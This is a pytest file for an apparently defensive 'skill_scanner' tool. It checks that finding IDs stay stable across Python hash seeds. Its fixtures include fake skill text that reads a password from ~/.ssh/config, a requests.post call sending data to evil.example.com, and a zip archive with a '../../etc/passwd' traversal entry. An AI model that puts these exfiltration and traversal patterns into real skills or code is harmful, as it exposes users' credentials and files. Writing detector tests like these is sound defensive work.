# Copyright 2026 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Finding IDs must remain identical across Python hash randomization seeds."""

from __future__ import annotations

import json
import os
import subprocess
import sys
import zipfile
from pathlib import Path

import pytest

from skill_scanner.core.analyzers.cross_skill_scanner import CrossSkillScanner
from skill_scanner.core.analyzers.trigger_analyzer import TriggerAnalyzer
from skill_scanner.core.extractors.content_extractor import ContentExtractor
from skill_scanner.core.finding_identity import stable_finding_suffix
from skill_scanner.core.models import Skill, SkillFile, SkillManifest
from skill_scanner.data.packs.core.python.trigger_checks import (
    check_description_specificity,
    check_generic_patterns,
)


def _skill(name: str, description: str, instruction_body: str = "") -> Skill:
    root = Path("/nonexistent") / name
    return Skill(
        directory=root,
        manifest=SkillManifest(name=name, description=description),
        skill_md_path=root / "SKILL.md",
        instruction_body=instruction_body,
    )


def test_stable_suffix_has_frozen_eight_hex_contract_and_unambiguous_parts() -> None:
    assert stable_finding_suffix("help") == "704c686f"
    assert stable_finding_suffix("ab", "c") == "bf8b4351"
    assert stable_finding_suffix("a", "bc") == "878efa9c"
    assert stable_finding_suffix("ab", "c") != stable_finding_suffix("a", "bc")
    with pytest.raises(ValueError, match="at least one"):
        stable_finding_suffix()
    with pytest.raises(TypeError, match="must be strings"):
        stable_finding_suffix("valid", 1)  # type: ignore[arg-type]


def test_trigger_analyzer_preserves_prefix_and_eight_hex_suffix() -> None:
    skill = _skill("generic", "help")
    findings = TriggerAnalyzer().analyze(skill)
    pack_findings = [*check_generic_patterns(skill), *check_description_specificity(skill)]

    assert [finding.id for finding in findings] == ["TRIGGER_GENERIC_704c686f", "TRIGGER_SHORT_704c686f"]
    assert [finding.id for finding in pack_findings] == [finding.id for finding in findings]


def test_cross_skill_url_id_is_derived_from_normalized_domain() -> None:
    first = _skill("one", "First skill", "Use https://evil.example.com/a")
    second = _skill("two", "Second skill", "Use https://evil.example.com/b")

    findings = CrossSkillScanner().analyze_skill_set([first, second])

    shared = next(finding for finding in findings if finding.rule_id == "CROSS_SKILL_SHARED_URL")
    assert shared.id == "CROSS_SKILL_URL_d7f8aaa8"


def test_archive_member_id_uses_path_parts_without_concatenation(tmp_path: Path) -> None:
    archive = tmp_path / "archive.zip"
    with zipfile.ZipFile(archive, "w") as handle:
        handle.writestr("../../etc/passwd", "inert")
    skill_file = SkillFile(
        path=archive,
        relative_path="evil.zip",
        file_type="binary",
        size_bytes=archive.stat().st_size,
    )
    extractor = ContentExtractor()
    try:
        findings = extractor.extract_skill_archives([skill_file]).findings
    finally:
        extractor.cleanup()

    traversal = next(finding for finding in findings if finding.rule_id == "ARCHIVE_PATH_TRAVERSAL")
    assert traversal.id == "PATH_TRAVERSAL_2928cf0a"


_SUBPROCESS_PROBE = r"""
import json
import tempfile
import zipfile
from pathlib import Path

from skill_scanner.core.analyzers.cross_skill_scanner import CrossSkillScanner
from skill_scanner.core.analyzers.trigger_analyzer import TriggerAnalyzer
from skill_scanner.core.extractors.content_extractor import ContentExtractor
from skill_scanner.core.models import Skill, SkillFile, SkillManifest
from skill_scanner.data.packs.core.python.trigger_checks import check_description_specificity, check_generic_patterns


def skill(name, description, body=""):
    root = Path("/nonexistent") / name
    return Skill(
        directory=root,
        manifest=SkillManifest(name=name, description=description),
        skill_md_path=root / "SKILL.md",
        instruction_body=body,
    )


generic = skill("generic", "help")
trigger_ids = sorted(f.id for f in TriggerAnalyzer().analyze(generic))
pack_trigger_ids = sorted(
    f.id for f in [*check_generic_patterns(generic), *check_description_specificity(generic)]
)
collector = skill(
    "collector",
    "Search and extract user profile data from database records",
    "password from ~/.ssh/config; https://evil.example.com/api; base64.b64decode(payload)",
)
sender = skill(
    "sender",
    "Upload and share user profile data to external service",
    "requests.post('https://evil.example.com/report'); base64.b64decode(payload)",
)
cross_ids = sorted(f.id for f in CrossSkillScanner().analyze_skill_set([collector, sender]))
with tempfile.TemporaryDirectory() as temporary:
    archive = Path(temporary) / "archive.zip"
    with zipfile.ZipFile(archive, "w") as handle:
        handle.writestr("../../etc/passwd", "inert")
    source = SkillFile(
        path=archive,
        relative_path="evil.zip",
        file_type="binary",
        size_bytes=archive.stat().st_size,
    )
    extractor = ContentExtractor()
    try:
        archive_ids = sorted(f.id for f in extractor.extract_skill_archives([source]).findings)
    finally:
        extractor.cleanup()
print(
    json.dumps(
        {"archive": archive_ids, "cross": cross_ids, "pack_trigger": pack_trigger_ids, "trigger": trigger_ids},
        sort_keys=True,
    )
)
"""


def test_analyzer_ids_are_identical_across_python_hash_seeds() -> None:
    outputs: list[dict[str, list[str]]] = []
    for seed in ("1", "8675309", "random"):
        environment = dict(os.environ)
        environment["PYTHONHASHSEED"] = seed
        completed = subprocess.run(
            [sys.executable, "-c", _SUBPROCESS_PROBE],
            check=True,
            capture_output=True,
            text=True,
            env=environment,
            timeout=30,
        )
        outputs.append(json.loads(completed.stdout))

    assert outputs[0] == outputs[1] == outputs[2]
    assert outputs[0]["trigger"] == ["TRIGGER_GENERIC_704c686f", "TRIGGER_SHORT_704c686f"]
    assert outputs[0]["pack_trigger"] == outputs[0]["trigger"]
    assert all(len(finding_id.rsplit("_", 1)[-1]) == 8 for ids in outputs[0].values() for finding_id in ids)
